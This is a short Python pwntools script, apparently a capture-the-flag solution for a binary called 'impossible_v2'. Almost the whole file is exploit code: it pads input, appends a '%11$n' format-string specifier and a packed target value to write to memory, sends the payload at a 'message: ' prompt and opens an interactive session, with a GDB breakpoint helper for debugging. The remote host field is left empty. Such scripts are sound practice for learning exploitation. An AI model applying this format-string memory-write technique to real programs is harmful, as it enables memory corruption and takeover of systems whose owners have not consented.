#!/usr/bin/python3

from pwn import *

exe = ELF('impossible_v2', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

                b*main+536
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
key = 0x0
GDB()
payload = b"".ljust(16, b"a")
payload += b"%11$n".ljust(8, b"\0")
payload += p64(0x1234)
sla(b"message: ", payload)
p.interactive()
